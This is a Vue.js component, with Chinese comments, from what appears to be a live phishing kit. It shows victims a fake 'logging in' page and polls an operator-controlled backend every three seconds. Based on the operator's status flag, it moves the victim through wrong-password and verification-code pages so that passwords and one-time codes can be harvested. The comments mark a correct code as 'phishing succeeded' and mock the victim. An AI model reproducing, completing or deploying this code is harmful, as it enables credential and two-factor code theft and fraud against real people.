<template>
      <div style="margin-top: 60px;" id="animation">
          <img   
          width="55%"
          height="55%" src="../assets/loading.gif" alt="">
            <p style="color:#727272; text-align:center; font-size:16px;">正在登录请稍等...</p>
      </div>
</template>

<script>
// 这里可以导入其他文件（比如：组件，工具js，第三方插件js，json文件，图片文件等等）
import user from '@/api/user';

export default {
  // 组件注册
  components: {
  },
  // 定义属性
  data() {
    return {
      id:''
    }
  },
  // 计算属性，会监听依赖属性值随之变化
  computed: {
  },
  // 监控data中的数据变化
  watch: {},
  // 方法集合
  methods: {
    // 判断Redis中是否存在用户信息，如果存在就执行 -》后端append时间
    checkUserInfo() {
        user.info(this.id).then(response => {
          // 审核状态： 1 密码错误， 2 验证验证码 ， 3 验证码错误 ， 4 验证码正确 ，5 加载页面
          // console.log(response);
          if(response.code == "200") {
            console.log(response.user);
            if(response.user.auditstatus == 1) { //  1 密码错误
              console.log("密码错误");
              // 校验验证码
              user.update(this.id,1,`SB的已经跳转到密码错误页面`).then(res => {
              })
              this.$router.push({path:"/errpass",query:{"id":this.id}})
            }else if(response.user.auditstatus == 2) { // 2 验证验证码
              console.log("验证验证码");
              // 校验验证码
              user.update(this.id,2,`SB的已经跳转到（验证）验证码页面`).then(res => {
                      
              })
              this.$router.push({path:"/check",query:{"id":this.id}})
            }else if(response.user.auditstatus == 3) { //  3 验证码错误
              console.log("验证码错误");
               // 校验验证码
              user.update(this.id,3,`SB的页面已经跳转到错误验证码的页面`).then(res => {
                      
              })
              this.$router.push({path:"/err",query:{"id":this.id}})
            }else if(response.user.auditstatus == 4) { // 4 验证码正确
              console.log("验证码正确");
               // 验证码正确，代表钓鱼成功
              user.update(this.id,4,`钓鱼成功`).then(res => {
              })
              // 跳转加载文档页面
              this.$router.push({path:"/loadingWD",query:{}})
            }else if(response.user.auditstatus == 5) { // 5 加载页面
              console.log("加载页面");
            }else  {

            }
          }
        })
    }
  },
  // 生命周期 - 创建完成（可以访问当前this实例）
  created() {
    
  },
  // 生命周期 - 挂载完成（可以访问DOM元素）
  mounted() {
      // 赋值用户ID
      this.id = this.$route.query["id"];
      // 定时检测是否存在用户信息续签
      setInterval(this.checkUserInfo, 3000);
  },
  beforeCreate() {}, // 生命周期 - 创建之前
  beforeMount() {}, // 生命周期 - 挂载之前
  beforeUpdate() {}, // 生命周期 - 更新之前
  updated() {}, // 生命周期 - 更新之后
  beforeDestroy() {}, // 生命周期 - 销毁之前
  destroyed() {}, // 生命周期 - 销毁完成
  activated() {}, // 如果页面有keep-alive缓存功能，这个函数会触发
}
</script>

<style>
  #animation{
    width: 100%;
    height: 100%;
  }
</style>